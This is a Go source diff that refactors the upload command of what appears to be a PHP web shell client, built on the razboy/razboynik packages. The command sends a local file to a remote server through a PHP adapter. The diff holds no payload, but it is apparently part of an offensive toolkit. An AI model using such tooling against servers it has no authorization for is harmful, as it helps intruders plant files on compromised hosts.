@@ -1,58 +1,74 @@
-// package phpmodule
+package phpmodule
 
-// import (
-// 	"errors"
-// 	"strings"
+import (
+	"errors"
+	"strings"
 
-// 	"github.com/eatbytes/razboy"
-// 	"github.com/eatbytes/razboy/adapter/phpadapter"
-// 	"github.com/eatbytes/razboynik/services/kernel"
-// )
+	"github.com/eatbytes/razboy"
+	"github.com/eatbytes/razboy/adapter/phpadapter"
+	"github.com/eatbytes/razboynik/services/kernel"
+)
 
-// func Upload(kc *kernel.KernelCmd, c *razboy.Config) (*kernel.KernelCmd, error) {
-// 	var (
-// 		request       *razboy.REQUEST
-// 		rzRes         *razboy.RESPONSE
-// 		local, remote string
-// 		arr           []string
-// 		err           error
-// 	)
+type Uploadcmd struct{}
 
-// 	if kc.GetArrLgt() < 2 {
-// 		return kc, errors.New("Please write the path of the local file to upload")
-// 	}
+func (u *Uploadcmd) Exec(kl *kernel.KernelLine, config *razboy.Config) (kernel.KernelCommand, error) {
+	var (
+		local, remote string
+		err           error
+		request       *razboy.REQUEST
+		response      *razboy.RESPONSE
+	)
 
-// 	request = razboy.CreateRequest("", c)
+	args := kl.GetArr()
 
-// 	arr = kc.GetArr()
-// 	local = arr[1]
+	if len(args) < 1 {
+		return u, errors.New("Please write the path of the local file to upload")
+	}
 
-// 	if kc.GetArrLgt() > 2 {
-// 		remote = arr[2]
-// 	} else {
-// 		pathArr := strings.Split(local, "/")
-// 		lgt := len(pathArr) - 1
-// 		remote = pathArr[lgt]
-// 	}
+	request = razboy.CreateRequest(kl.GetRaw(), config)
+	local = args[0]
 
-// 	rzRes, err = UploadAction(local, remote, request)
-// 	kc.SetResponse(rzRes)
+	if len(args) > 1 {
+		remote = args[1]
+	} else {
+		pathArr := strings.Split(local, "/")
+		lgt := len(pathArr) - 1
+		remote = pathArr[lgt]
+	}
 
-// 	if err != nil {
-// 		return kc, err
-// 	}
+	response, err = UploadAction(local, remote, request)
 
-// 	if kc.GetResult() != "1" {
-// 		return kc, errors.New("Server havn't upload the file")
-// 	}
+	if err != nil {
+		return u, err
+	}
 
-// 	return kc, nil
-// }
+	if response.GetResult() != "1" {
+		return u, errors.New("Server havn't upload the file")
+	}
 
-// func UploadAction(local, remote string, request *razboy.REQUEST) (*razboy.RESPONSE, error) {
-// 	request.Action = phpadapter.CreateUpload(remote)
-// 	request.Upload = true
-// 	request.UploadPath = local
+	return u, nil
+}
 
-// 	return razboy.Send(request)
-// }
+func (u *Uploadcmd) GetName() string {
+	return "-upload"
+}
+
+func (u *Uploadcmd) GetCompleter() (kernel.CompleteFunction, bool) {
+	return nil, false
+}
+
+func (u *Uploadcmd) GetResult() []byte {
+	return make([]byte, 0)
+}
+
+func (u *Uploadcmd) GetResultStr() string {
+	return ""
+}
+
+func UploadAction(local, remote string, request *razboy.REQUEST) (*razboy.RESPONSE, error) {
+	request.Action = phpadapter.CreateUpload(remote)
+	request.Upload = true
+	request.UploadPath = local
+
+	return razboy.Send(request)
+}
